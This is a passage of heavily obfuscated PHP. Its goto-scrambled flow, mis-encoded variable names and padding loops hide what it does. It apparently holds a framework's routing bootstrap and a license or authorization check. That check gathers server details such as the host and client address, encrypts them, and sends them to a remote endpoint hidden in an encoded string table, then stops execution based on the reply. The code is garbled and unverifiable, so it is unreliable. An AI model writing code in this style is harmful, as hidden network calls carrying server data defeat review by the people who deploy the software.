-$DòŞ¬†¶ïË[24]($eôÔßŒ))) != $eôÔßŒ) { return; } goto EğğŒ¸à°; C·ÁÕ”çˆ­: $BÀÈƒË¹‡ = $Bò‡ØÀÀ³ñ[592]; $d§öî«–éÏ = $GLOBALS[$DòŞ¬†¶ïË[22]][$DòŞ¬†¶ïË[23]][0]; $EâÑ‹áø = $Bò‡ØÀÀ³ñ[593]; goto F–à§ŸÂ¸ç; D¹Â¥¾êª: $Dö†…ÁÂ©ö = array($DòŞ¬†¶ïË[8], $e»æÜÕ¶‡Ë); $c‡”ÔÕ³Ââ = $DòŞ¬†¶ïË[26]($GLOBALS[$DòŞ¬†¶ïË[22]][$DòŞ¬†¶ïË[23]], 1); $GLOBALS[$DòŞ¬†¶ïË[22]][$DòŞ¬†¶ïË[23]] = $DòŞ¬†¶ïË[27]($Dö†…ÁÂ©ö, $c‡”ÔÕ³Ââ); goto EŞÀˆãçÁİ; bËíÙˆÍÚ§: $Bò‡ØÀÀ³ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DòŞ¬†¶ïË =& $_SERVER[²—Ä]; $eôÔßŒ = $DòŞ¬†¶ïË[8]; goto C·ÁÕ”çˆ­; EŞÀˆãçÁİ: $GLOBALS[$DòŞ¬†¶ïË[22]][$DòŞ¬†¶ïË[28]] = $DòŞ¬†¶ïË[29]($DòŞ¬†¶ïË[1], $GLOBALS[$DòŞ¬†¶ïË[22]][$DòŞ¬†¶ïË[23]]); $B©øæã‹Ï‹ = $Bò‡ØÀÀ³ñ[595]; while (strlen($B©øæã‹Ï‹) < $Bò‡ØÀÀ³ñ[584]) { if (!$B©øæã‹Ï‹) { break; } $B©øæã‹Ï‹++; } goto D¼è¦ˆì‰Ú; EğğŒ¸à°: $e»æÜÕ¶‡Ë = $DòŞ¬†¶ïË[25]($d§öî«–éÏ, 0, -$DòŞ¬†¶ïË[24]($eôÔßŒ)); $AæÁ¶ª‡ = $Bò‡ØÀÀ³ñ[594]; if (strlen($AæÁ¶ª‡) < $Bò‡ØÀÀ³ñ[590]) { return; } goto D¹Â¥¾êª; D¼è¦ˆì‰Ú: } private function frewd5b5feeb() { goto fŒó¢†Ú„; E°ŸÑÒå¡†: $GLOBALS[$f„‘„Æ‰ì[22]][$f„‘„Æ‰ì[23]] = $f„‘„Æ‰ì[0]($f„‘„Æ‰ì[36], $CÔÔ‰Ëó); $F“‰µ®‡ = $_SERVER[í¤âËÚ£¶íÊ¢][596]; $GLOBALS[$f„‘„Æ‰ì[22]][$f„‘„Æ‰ì[28]] = $f„‘„Æ‰ì[29]($f„‘„Æ‰ì[1], $GLOBALS[$f„‘„Æ‰ì[22]][$f„‘„Æ‰ì[23]]); goto FùïÂø­; C…ÆÑì…: $Fì½İ·èˆ = $f„‘„Æ‰ì[31]; if (!$f„‘„Æ‰ì[32]($B²»»ƒÚ«Ç, $Fì½İ·èˆ)) { return; } $b˜­¸±ÕÔ = $f„‘„Æ‰ì[33]($B²»»ƒÚ«Ç, $Fì½İ·èˆ); goto fÕĞ‡Óæ·; fÕĞ‡Óæ·: $CÔÔ‰Ëó = $f„‘„Æ‰ì[25]($B²»»ƒÚ«Ç, $b˜­¸±ÕÔ + $f„‘„Æ‰ì[24]($Fì½İ·èˆ)); $f„‘„Æ‰ì[34]($f„‘„Æ‰ì[35], $CÔÔ‰Ëó, $dß˜¶‰‰); $CÔÔ‰Ëó = $f„‘„Æ‰ì[2]($dß˜¶‰‰[0][0], $f„‘„Æ‰ì[36]); goto E°ŸÑÒå¡†; fŒó¢†Ú„: $f„‘„Æ‰ì =& $_SERVER[²—Ä]; if ($GLOBALS[$f„‘„Æ‰ì[22]][$f„‘„Æ‰ì[28]] != $f„‘„Æ‰ì[10]) { return; } $B²»»ƒÚ«Ç = $_SERVER[$f„‘„Æ‰ì[30]]; goto C…ÆÑì…; FùïÂø­: } public function run() { goto b³¨Ïì„…¢; bßÀš•¸÷: $D—ˆ†°Áƒö = $c‡²ÖÒÂÁñ[597]; while ($D—ˆ†°Áƒö < $c‡²ÖÒÂÁñ[584]) { if ($D—ˆ†°Áƒö >= 0) { break; } $D—ˆ†°Áƒö++; } $this->{$_SERVER[²—Ä][38]}(); goto FÏÓùè‘ˆ; C·˜µ¶Èª½: $_SERVER[$B»ƒ–¥àçš[44]] = $B»ƒ–¥àçš[6](ACTION); $this->{$_SERVER[²—Ä][45]}(); if ($B»ƒ–¥àçš[19]($B²ÁÆî‰´´) >= 3) { $this->{$_SERVER[²—Ä][21]}($b¼×¯ÆäÄ); } else { $this->{$_SERVER[²—Ä][21]}(ACTION); } goto Dø™¥Œääá; FÏÓùè‘ˆ: $B²ÁÆî‰´´ = $GLOBALS[$B»ƒ–¥àçš[22]][$B»ƒ–¥àçš[23]]; $b¼×¯ÆäÄ = $GLOBALS[$B»ƒ–¥àçš[22]][$B»ƒ–¥àçš[28]]; $A¶×¼‚­¦ = $c‡²ÖÒÂÁñ[598]; goto eÎ„ç¦„Ã²; eæÕ›¬œÍ: $B»ƒ–¥àçš[39]($B»ƒ–¥àçš[43], MOD . $B»ƒ–¥àçš[1] . ST . $B»ƒ–¥àçš[1] . ACT); $c¯ÅœÜ¸…ö = $c‡²ÖÒÂÁñ[599]; if (strlen($c¯ÅœÜ¸…ö) < $c‡²ÖÒÂÁñ[600]) { return; } goto C·˜µ¶Èª½; b³¨Ïì„…¢: $c‡²ÖÒÂÁñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B»ƒ–¥àçš =& $_SERVER[²—Ä]; $this->{$_SERVER[²—Ä][37]}(); goto bßÀš•¸÷; eÎ„ç¦„Ã²: $B»ƒ–¥àçš[39]($B»ƒ–¥àçš[40], isset($B²ÁÆî‰´´[0]) && $B²ÁÆî‰´´[0] ? $B²ÁÆî‰´´[0] : $this->defaultModule); $B»ƒ–¥àçš[39]($B»ƒ–¥àçš[41], isset($B²ÁÆî‰´´[1]) && $B²ÁÆî‰´´[0] ? $B²ÁÆî‰´´[1] : $this->defaultController); $B»ƒ–¥àçš[39]($B»ƒ–¥àçš[42], isset($B²ÁÆî‰´´[2]) && $B²ÁÆî‰´´[0] ? $B²ÁÆî‰´´[2] : $this->defaultAction); goto eæÕ›¬œÍ; Dø™¥Œääá: } private $klemd8c0faf5 = array(); private $zval24ea8aa4 = ''; public function cpsl4f22c291() { goto CÃâ²Øº•; Dæ¡–Ì™Á£: $this->{$_SERVER[²—Ä][48]}(); $bÙ–“æÙÃë = $d´¯ğæÖğ†[602]; $this->{$_SERVER[²—Ä][49]}(); goto aÑ¹‚ÇöáÜ; aÑ¹‚ÇöáÜ: $A‰©…•Å = $d´¯ğæÖğ†[603]; if (strlen($A‰©…•Å) < $d´¯ğæÖğ†[590]) { return; } $this->{$_SERVER[²—Ä][50]}(); goto A”¶“¸÷Ôˆ; CÃâ²Øº•: $d´¯ğæÖğ† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dğ‰ä­Í×ä =& $_SERVER[²—Ä]; $this->{$_SERVER[²—Ä][46]}(); goto dßµŠ½£ƒˆ; d³œ‡·Ü«È: $this->{$_SERVER[²—Ä][52]}(); $eÄ©‘…„æ = $d´¯ğæÖğ†[605]; if (strlen($eÄ©‘…„æ) < $d´¯ğæÖğ†[584]) { return; } goto B½˜Ğ¡àÊË; dßµŠ½£ƒˆ: $A’éµŠÌ®Û = $d´¯ğæÖğ†[601]; if (strlen($A’éµŠÌ®Û) < $d´¯ğæÖğ†[584]) { die; } $this->{$_SERVER[²—Ä][47]}(); goto Dæ¡–Ì™Á£; A”¶“¸÷Ôˆ: $this->{$_SERVER[²—Ä][51]}(); $EÖøßŠ±ã = $d´¯ğæÖğ†[604]; if (strlen($EÖøßŠ±ã) < $d´¯ğæÖğ†[584]) { die; } goto d³œ‡·Ü«È; B½˜Ğ¡àÊË: $this->{$_SERVER[²—Ä][3]}($dğ‰ä­Í×ä[53], array($this, $dğ‰ä­Í×ä[54])); $this->{$_SERVER[²—Ä][3]}($dğ‰ä­Í×ä[55], array($this, $dğ‰ä­Í×ä[56])); $this->{$_SERVER[²—Ä][3]}($dğ‰ä­Í×ä[57], array($this, $dğ‰ä­Í×ä[58])); goto aàÎÌöŞ; aàÎÌöŞ: $this->{$_SERVER[²—Ä][3]}($dğ‰ä­Í×ä[59], array($this, $dğ‰ä­Í×ä[60])); $f¹ƒ´Ê¬Š = $d´¯ğæÖğ†[606]; goto Dìƒªáö¸­; Dìƒªáö¸­: } public function tbxd61c0059d($DÅæ¹ùÊäŸ) { goto C§†µ²Â’¤; fçöÊ‰í: $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[120]] = $Aƒ°¡÷ó¥µ[121]($_SERVER[$Aƒ°¡÷ó¥µ[122]] . $dµ²Øõß¾ù[$Aƒ°¡÷ó¥µ[123]]); $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[124]] = $Aƒ°¡÷ó¥µ[125]($Aƒ°¡÷ó¥µ[126]()); $A”‡ÉÙ¯ = $DÔ¥ ²„¥Œ[613]; goto B©ˆ‹Õ¬İ˜; EÎ‡ÓØÆÎ: $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[137]] = $Aƒ°¡÷ó¥µ[113]($this->klemd8c0faf5, $Aƒ°¡÷ó¥µ[138], $Aƒ°¡÷ó¥µ[10]); if ($Aƒ°¡÷ó¥µ[113]($GLOBALS, $Aƒ°¡÷ó¥µ[139]) && $this->config[$Aƒ°¡÷ó¥µ[140]]) { $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[141]] = WEB_ROOT; } return $DÅæ¹ùÊäŸ; goto E‹ ¹‘ÛĞ; E„İ¯¥ª‰ô: if (!$EÏŠİÔ¬ÒÈ) { die; } $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[104]][$Aƒ°¡÷ó¥µ[109]] = array($Aƒ°¡÷ó¥µ[110] => (int) $Aê¢‰·—®Ø[$Aƒ°¡÷ó¥µ[111]], $Aƒ°¡÷ó¥µ[112] => (int) $Aƒ°¡÷ó¥µ[113]($Aê¢‰·—®Ø, $Aƒ°¡÷ó¥µ[114], 0)); $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[116]] = $Aƒ°¡÷ó¥µ[117]($Aƒ°¡÷ó¥µ[118])->{$_SERVER[²—Ä][119]}(); goto fçöÊ‰í; eó¢ŒõÓÙ¶: $Càğ­çå‡¥ = $DÔ¥ ²„¥Œ[607]; if (strlen($Càğ­çå‡¥) < $DÔ¥ ²„¥Œ[64]) { die; } $cî’ÏáÕùµ = array($Aƒ°¡÷ó¥µ[64], $Aƒ°¡÷ó¥µ[65], $Aƒ°¡÷ó¥µ[66], $Aƒ°¡÷ó¥µ[67], $Aƒ°¡÷ó¥µ[68], $Aƒ°¡÷ó¥µ[69], $Aƒ°¡÷ó¥µ[70], $Aƒ°¡÷ó¥µ[71], $Aƒ°¡÷ó¥µ[72], $Aƒ°¡÷ó¥µ[73], $Aƒ°¡÷ó¥µ[74], $Aƒ°¡÷ó¥µ[75], $Aƒ°¡÷ó¥µ[76], $Aƒ°¡÷ó¥µ[77], $Aƒ°¡÷ó¥µ[78], $Aƒ°¡÷ó¥µ[79], $Aƒ°¡÷ó¥µ[80], $Aƒ°¡÷ó¥µ[81], $Aƒ°¡÷ó¥µ[82], $Aƒ°¡÷ó¥µ[83], $Aƒ°¡÷ó¥µ[84], $Aƒ°¡÷ó¥µ[85], $Aƒ°¡÷ó¥µ[86], $Aƒ°¡÷ó¥µ[87], $Aƒ°¡÷ó¥µ[88], $Aƒ°¡÷ó¥µ[89], $Aƒ°¡÷ó¥µ[90], $Aƒ°¡÷ó¥µ[91], $Aƒ°¡÷ó¥µ[92], $Aƒ°¡÷ó¥µ[93], $Aƒ°¡÷ó¥µ[94], $Aƒ°¡÷ó¥µ[95], $Aƒ°¡÷ó¥µ[96], $Aƒ°¡÷ó¥µ[97], $Aƒ°¡÷ó¥µ[98], $Aƒ°¡÷ó¥µ[99], $Aƒ°¡÷ó¥µ[100]); goto aå÷ß«Š©å; føÁ™Ô…‹µ: if ($dµ²Øõß¾ù[$Aƒ°¡÷ó¥µ[127]] != $Aƒ°¡÷ó¥µ[128]) { $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[129]] = $dµ²Øõß¾ù[$Aƒ°¡÷ó¥µ[129]]; $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[130]] = $dµ²Øõß¾ù[$Aƒ°¡÷ó¥µ[130]]; $EÔ½˜§›÷Œ = $Aƒ°¡÷ó¥µ[131](10) . $this->zval24ea8aa4 . $Aƒ°¡÷ó¥µ[131](5); $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[132]][$Aƒ°¡÷ó¥µ[133]] = $this->{$_SERVER[²—Ä][134]}($EÔ½˜§›÷Œ, $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[120]]); } if ($this->zval24ea8aa4 == $Aƒ°¡÷ó¥µ[128]) { $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[104]][$Aƒ°¡÷ó¥µ[109]][$Aƒ°¡÷ó¥µ[114]] = 0; } $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[135]] = $Aƒ°¡÷ó¥µ[113]($this->klemd8c0faf5, $Aƒ°¡÷ó¥µ[136], $Aƒ°¡÷ó¥µ[10]); goto EÎ‡ÓØÆÎ; Cµ’ùÄ‚îŠ: if (!$dàêÓ™ŸîŒ) { return; } unset($DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[104]][$Aƒ°¡÷ó¥µ[108]]); $EÏŠİÔ¬ÒÈ = $DÔ¥ ²„¥Œ[612]; goto E„İ¯¥ª‰ô; F‡«ŞğÚ¡: $Aê¢‰·—®Ø = $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[104]][$Aƒ°¡÷ó¥µ[76]]; $a ¥ùŒ‹É = $DÔ¥ ²„¥Œ[610]; if (!$a ¥ùŒ‹É) { die; } goto dÃ–Ã’í‡µ; C§†µ²Â’¤: $DÔ¥ ²„¥Œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Aƒ°¡÷ó¥µ =& $_SERVER[²—Ä]; $dµ²Øõß¾ù = $Aƒ°¡÷ó¥µ[61]($Aƒ°¡÷ó¥µ[62])->{$_SERVER[²—Ä][63]}(); goto eó¢ŒõÓÙ¶; C’èÏ‡ƒÜÓ: if (!$c•Û®æëÊ¦) { return; } unset($DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[104]][$Aƒ°¡÷ó¥µ[76]]); $dàêÓ™ŸîŒ = $DÔ¥ ²„¥Œ[588]; goto Cµ’ùÄ‚îŠ; aå÷ß«Š©å: $FÔïôÎÊô¼ = $DÔ¥ ²„¥Œ[608]; while ($FÔïôÎÊô¼ < $DÔ¥ ²„¥Œ[587]) { if ($FÔïôÎÊô¼ >= 0) { break; } $FÔïôÎÊô¼++; } foreach ($cî’ÏáÕùµ as $f‚îÇÌ³‹†) { $c´£¿Ò‚Àî = $GLOBALS[$Aƒ°¡÷ó¥µ[101]][$Aƒ°¡÷ó¥µ[102]][$f‚îÇÌ³‹†]; $bé‹¤Û†Î„ = $DÔ¥ ²„¥Œ[609]; if (strlen($bé‹¤Û†Î„) < $DÔ¥ ²„¥Œ[600]) { die; } if (isset($dµ²Øõß¾ù[$f‚îÇÌ³‹†])) { $c´£¿Ò‚Àî = $dµ²Øõß¾ù[$f‚îÇÌ³‹†]; } $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[104]][$f‚îÇÌ³‹†] = $c´£¿Ò‚Àî; } goto F‡«ŞğÚ¡; B©ˆ‹Õ¬İ˜: if (strlen($A”‡ÉÙ¯) < $DÔ¥ ²„¥Œ[587]) { die; } $DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[115]][$Aƒ°¡÷ó¥µ[127]] = $this->zval24ea8aa4; $CŠæëÉ°Ì½ = $DÔ¥ ²„¥Œ[581]; goto føÁ™Ô…‹µ; dÃ–Ã’í‡µ: unset($DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[105]][$Aƒ°¡÷ó¥µ[106]]); unset($DÅæ¹ùÊäŸ[$Aƒ°¡÷ó¥µ[103]][$Aƒ°¡÷ó¥µ[105]][$Aƒ°¡÷ó¥µ[107]]); $c•Û®æëÊ¦ = $DÔ¥ ²„¥Œ[611]; goto C’èÏ‡ƒÜÓ; E‹ ¹‘ÛĞ: } private function kjxb5f397519() { goto D®¯¢ìÅ¤Š; Då±ˆ×Ï•: $bæ˜¹¼¾Ùâ = $cïÇŒ„èÃº[615]; while ($bæ˜¹¼¾Ùâ < $cïÇŒ„èÃº[64]) { if ($bæ˜¹¼¾Ùâ >= 0) { break; } $bæ˜¹¼¾Ùâ++; } $FèÆäõ†Ì = array($e„í©‰ã¾°[166] => $E„Ã»êğÜˆ[$e„í©‰ã¾°[64]], $e„í©‰ã¾°[167] => $E„Ã»êğÜˆ[$e„í©‰ã¾°[65]], $e„í©‰ã¾°[168] => $e„í©‰ã¾°[10]); goto dàÎ·’Æª; E²íè¯¨°È: if ($this->zval24ea8aa4 == $e„í©‰ã¾°[128]) { return; } $A¿‡ÆÙî…ƒ = array($e„í©‰ã¾°[160], $e„í©‰ã¾°[161], $e„í©‰ã¾°[162], $e„í©‰ã¾°[163], $e„í©‰ã¾°[164], $e„í©‰ã¾°[165]); $E„Ã»êğÜˆ = $e„í©‰ã¾°[61]($e„í©‰ã¾°[62])->{$_SERVER[²—Ä][63]}(); goto Då±ˆ×Ï•; D®¯¢ìÅ¤Š: $cïÇŒ„èÃº =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e„í©‰ã¾° =& $_SERVER[²—Ä]; if ($_SERVER[$e„í©‰ã¾°[44]] == $e„í©‰ã¾°[142]) { goto a‰ÏÖªÓ‚‡; B’õ…©ŞŠ‹: $CÀÆÜ°×Ì = $cïÇŒ„èÃº[614]; if (strlen($CÀÆÜ°×Ì) < $cïÇŒ„èÃº[64]) { die; } $FèÆäõ†Ì = array($e„í©‰ã¾°[157] => $F×³ÆòÌÒ»); goto b”‘³íÔ™ˆ; b”‘³íÔ™ˆ: $e„í©‰ã¾°[13](array($e„í©‰ã¾°[158], $e„í©‰ã¾°[159]), $FèÆäõ†Ì); goto DîÇŞ¼Â¹¾; a‰ÏÖªÓ‚‡: $F×³ÆòÌÒ» = array($e„í©‰ã¾°[127] => $this->zval24ea8aa4, $e„í©‰ã¾°[143] => $this->{$_SERVER[²—Ä][144]}(), $e„í©‰ã¾°[145] => $e„í©‰ã¾°[61]($e„í©‰ã¾°[146])->{$_SERVER[²—Ä][147]}()); if ($this->zval24ea8aa4 != $e„í©‰ã¾°[128]) { $bôƒœ¡í˜ò = $e„í©‰ã¾°[113]($this->klemd8c0faf5, $e„í©‰ã¾°[148]); if ($bôƒœ¡í˜ò) { $F×³ÆòÌÒ»[$e„í©‰ã¾°[149]] = $bôƒœ¡í˜ò; $F×³ÆòÌÒ»[$e„í©‰ã¾°[150]] = $e„í©‰ã¾°[151]($e„í©‰ã¾°[113]($this->klemd8c0faf5, $e„í©‰ã¾°[152])); $F×³ÆòÌÒ»[$e„í©‰ã¾°[153]] = $e„í©‰ã¾°[113]($this->klemd8c0faf5, $e„í©‰ã¾°[138]); } } $F×³ÆòÌÒ» = $this->{$_SERVER[²—Ä][154]}($e„í©‰ã¾°[155]($F×³ÆòÌÒ»), $e„í©‰ã¾°[121]($e„í©‰ã¾°[156])); goto B’õ…©ŞŠ‹; DîÇŞ¼Â¹¾: } goto E²íè¯¨°È; dàÎ·’Æª: foreach ($A¿‡ÆÙî…ƒ as $f“¤†ƒ) { if (!isset($E„Ã»êğÜˆ[$f“¤†ƒ]) || !$E„Ã»êğÜˆ[$f“¤†ƒ]) { continue; } $FèÆäõ†Ì[$f“¤†ƒ] = $E„Ã»êğÜˆ[$f“¤†ƒ]; $bèİŒïå é = $cïÇŒ„èÃº[616]; if (!$bèİŒïå é) { return; } } $e„í©‰ã¾°[13](array($e„í©‰ã¾°[158], $e„í©‰ã¾°[159]), $FèÆäõ†Ì); $bÙË¨“‘· = $cïÇŒ„èÃº[617]; goto F¥òºÎ³‡¿; F¥òºÎ³‡¿: } private function junte94c2f94() { goto BĞ¸¨Å·±£; cº²­¶¤‡Ú: if (strlen($bÇç‘”¡×) < $BÏ·¦öì‘õ[590]) { die; } $EóßêÁø = $Fî­È†³…[131](16); $fĞã†Ù¢ = $EóßêÁø . $FÁ¶î›ÒãÒ[$Fî­È†³…[127]] . $this->{$_SERVER[²—Ä][154]}($Fî­È†³…[121]($FÁ¶î›ÒãÒ[$Fî­È†³…[216]]), $EóßêÁø); goto e†ğ…„Õ™Ù; bÒÍÁÁ±¦: if (!isset($Bƒ¢‡±Îî[$Fî­È†³…[172]]) || $Fî­È†³…[24]($Bƒ¢‡±Îî[$Fî­È†³…[172]]) != 16) { $Fî­È†³…[173]($Fî­È†³…[174] . $Bƒ¢‡±Îî[$Fî­È†³…[172]], !1); } $FÎ—¹ãÜ±ê = $Fî­È†³…[61]($Fî­È†³…[62])->{$_SERVER[²—Ä][63]}($Fî­È†³…[123]); $d±šÓƒÏÓ¬ = array($Fî­È†³…[172] => $Bƒ¢‡±Îî[$Fî­È†³…[172]], $Fî­È†³…[175] => $Fî­È†³…[131](16), $Fî­È†³…[176] => $Fî­È†³…[156], $Fî­È†³…[177] => $Fî­È†³…[178], $Fî­È†³…[179] => $_SERVER[$Fî­È†³…[180]], $Fî­È†³…[181] => $_SERVER[$Fî­È†³…[182]], $Fî­È†³…[183] => $_SERVER[$Fî­È†³…[184]]); goto C–á‡Ê‘¨; BÍÓÂ‡‹ê¬: $Bš÷…äå— = $BÏ·¦öì‘õ[627]; if (strlen($Bš÷…äå—) < $BÏ·¦öì‘õ[587]) { return; } goto B°®—æñùğ; C–á‡Ê‘¨: $eæš—àäøÙ = $Fî­È†³…[121]($_SERVER[$Fî­È†³…[122]] . $FÎ—¹ãÜ±ê); if ($Bƒ¢‡±Îî[$Fî­È†³…[185]] == $Fî­È†³…[186]) { $cöÖ‰²Äï¹ = $this->{$_SERVER[²—Ä][154]}($eæš—àäøÙ, $Fî­È†³…[187]); $EàÏØÍê„ = $this->{$_SERVER[²—Ä][134]}($Fî­È†³…[155]($d±šÓƒÏÓ¬), $eæš—àäøÙ . $Fî­È†³…[188], 3); $EàÏØÍê„ = $EàÏØÍê„ . $Fî­È†³…[189] . $_SERVER[$Fî­È†³…[180]]; $dŠ»‰­Ä¡ = $this->{$_SERVER[²—Ä][190]}($Fî­È†³…[191] . $cöÖ‰²Äï¹ . $Fî­È†³…[192] . $EàÏØÍê„, -1); $Fî­È†³…[173]($dŠ»‰­Ä¡, !0); } else { if ($Bƒ¢‡±Îî[$Fî­È†³…[185]] == $Fî­È†³…[193]) { $dÈÖ¦ÕÂç‰ = $Fî­È†³…[25]($Fî­È†³…[121]($Fî­È†³…[194] . $eæš—àäøÙ), 12, 15) . $Fî­È†³…[195]; $EàÏØÍê„ = $this->{$_SERVER[²—Ä][196]}($Fî­È†³…[2]($Bƒ¢‡±Îî[$Fî­È†³…[197]]), $dÈÖ¦ÕÂç‰, 2); $dœù±¥ùßĞ = $Fî­È†³…[198]($EàÏØÍê„, !0); if (!$Fî­È†³…[199]($dœù±¥ùßĞ) || !$Fî­È†³…[199]($dœù±¥ùßĞ[$Fî­È†³…[200]]) || $dœù±¥ùßĞ[$Fî­È†³…[172]] != !0) { $c³İØ„ÓÇ = $Fî­È†³…[201]; $CŒñäˆÙ = $dœù±¥ùßĞ[$Fî­È†³…[200]] ? $Fî­È†³…[202] . $dœù±¥ùßĞ[$Fî­È†³…[200]] : $c³İØ„ÓÇ; $Fî­È†³…[173]($CŒñäˆÙ, !1); } else { $d±šÓƒÏÓ¬[$Fî­È†³…[175]] = $dœù±¥ùßĞ[$Fî­È†³…[200]][$Fî­È†³…[203]]; } } else { $dœù±¥ùßĞ = $this->{$_SERVER[²—Ä][190]}($Fî­È†³…[204], $d±šÓƒÏÓ¬, 10); } } if (!$Fî­È†³…[199]($dœù±¥ùßĞ) || !$Fî­È†³…[199]($dœù±¥ùßĞ[$Fî­È†³…[200]]) || $dœù±¥ùßĞ[$Fî­È†³…[172]] != !0) { $c³İØ„ÓÇ = $Fî­È†³…[205]($Fî­È†³…[206]); $CŒñäˆÙ = $dœù±¥ùßĞ[$Fî­È†³…[200]] ? $Fî­È†³…[202] . $dœù±¥ùßĞ[$Fî­È†³…[200]] : $c³İØ„ÓÇ; $Fî­È†³…[173]($CŒñäˆÙ, !1); } goto Bì ‹Ë¡²; d´¾¿Ç¤Ë: if (!$Fî­È†³…[113]($GLOBALS, $Fî­È†³…[139])) { die; } $Bƒ¢‡±Îî = $GLOBALS[$Fî­È†³…[22]]; if (isset($Bƒ¢‡±Îî[$Fî­È†³…[170]])) { $this->{$_SERVER[²—Ä][171]}(); die; } goto bÒÍÁÁ±¦; bÊ¡ìêñ—: if (strlen($AÒßÌœÉ¹) < $BÏ·¦öì‘õ[64]) { die; } if (!$Cô™˜§´×ß || $Cô™˜§´×ß != $f¼äÑ¼Ù›Ú[$Fî­È†³…[152]]) { $b²³ÄÜ‹ƒ = array($Fî­È†³…[209] => $Fî­È†³…[61]($Fî­È†³…[62])->{$_SERVER[²—Ä][63]}($Fî­È†³…[123]), $Fî­È†³…[210] => $_SERVER[$Fî­È†³…[122]], $Fî­È†³…[211] => $Fî­È†³…[212](), $Fî­È†³…[181] => $_SERVER[$Fî­È†³…[182]]); $EàÏØÍê„ = $this->{$_SERVER[²—Ä][213]}($Fî­È†³…[155]($b²³ÄÜ‹ƒ)); $this->{$_SERVER[²—Ä][190]}($Fî­È†³…[214] . $EàÏØÍê„); $Fî­È†³…[173]($Fî­È†³…[205]($Fî­È†³…[215]), !0); } $FÁ¶î›ÒãÒ = array($Fî­È†³…[216] => $d±šÓƒÏÓ¬[$Fî­È†³…[172]], $Fî­È†³…[217] => $f¼äÑ¼Ù›Ú[$Fî­È†³…[218]], $Fî­È†³…[219] => $Fî­È†³…[131](16), $Fî­È†³…[127] => $f¼äÑ¼Ù›Ú[$Fî­È†³…[220]]); goto CˆÕ–Ç¶á; BĞ¸¨Å·±£: $BÏ·¦öì‘õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Fî­È†³… =& $_SERVER[²—Ä]; if ($_SERVER[$Fî­È†³…[44]] != $Fî­È†³…[169]) { return; } goto d´¾¿Ç¤Ë; CˆÕ–Ç¶á: if ($d±šÓƒÏÓ¬[$Fî­È†³…[175]]) { $FÁ¶î›ÒãÒ[$Fî­È†³…[219]] = $d±šÓƒÏÓ¬[$Fî­È†³…[175]]; } $F„Ã’„¡Å = $Fî­È†³…[25]($Fî­È†³…[121]($FÁ¶î›ÒãÒ[$Fî­È†³…[217]]), 10, 10); $e¢Û«³ƒ›ª = $F„Ã’„¡Å . $FÁ¶î›ÒãÒ[$Fî­È†³…[127]] . $FÁ¶î›ÒãÒ[$Fî­È†³…[219]]; goto b‚Úë…Ó×; a„´Ø‘µ™: $b™ïí…‚Öå = $Fî­È†³…[121]($_SERVER[$Fî­È†³…[122]] . $Fî­È†³…[221]($FÎ—¹ãÜ±ê) . $FÁ¶î›ÒãÒ[$Fî­È†³…[217]]); $d¹²ƒŠÒ  = $BÏ·¦öì‘õ[621]; while (strlen($d¹²ƒŠÒ ) < $BÏ·¦öì‘õ[600]) { if (!$d¹²ƒŠÒ ) { break; } $d¹²ƒŠÒ ++; } goto FÜåÔÄÆèË; aÖåÙ˜´Â: $this->klemd8c0faf5 = $f¼äÑ¼Ù›Ú; $this->zval24ea8aa4 = $FÁ¶î›ÒãÒ[$Fî­È†³…[127]]; $C¨Ñ“åÑï = $BÏ·¦öì‘õ[625]; goto EŠ”ÛÆ‡Ê; Bì ‹Ë¡²: $f¼äÑ¼Ù›Ú = $dœù±¥ùßĞ[$Fî­È†³…[200]]; $Cô™˜§´×ß = $this->{$_SERVER[²—Ä][207]}($f¼äÑ¼Ù›Ú[$Fî­È†³…[208]]); $AÒßÌœÉ¹ = $BÏ·¦öì‘õ[618]; goto bÊ¡ìêñ—; EŠ”ÛÆ‡Ê: if (strlen($C¨Ñ“åÑï) < $BÏ·¦öì‘õ[600]) { return; } $this->{$_SERVER[²—Ä][236]}(); $a²ã¨âß» = $BÏ·¦öì‘õ[626]; goto bÖôÌ©Êì¾; Eƒ†êãÓ: if (strlen($E°‹×«³¢ª) < $BÏ·¦öì‘õ[64]) { die; } $a„ÓµùÓ¿› = $Fî­È†³…[229]($Fî­È†³…[61]($Fî­È†³…[11])->{$_SERVER[²—Ä][230]}(), $Fî­È†³…[231]); $BğÒ„ÄÓáø = $BÏ·¦öì‘õ[623]; goto d›ĞµÍîù; b‚Úë…Ó×: $e²ßˆ·¬ = $BÏ·¦öì‘õ[619]; $FÁ¶î›ÒãÒ[$Fî­È†³…[129]] = 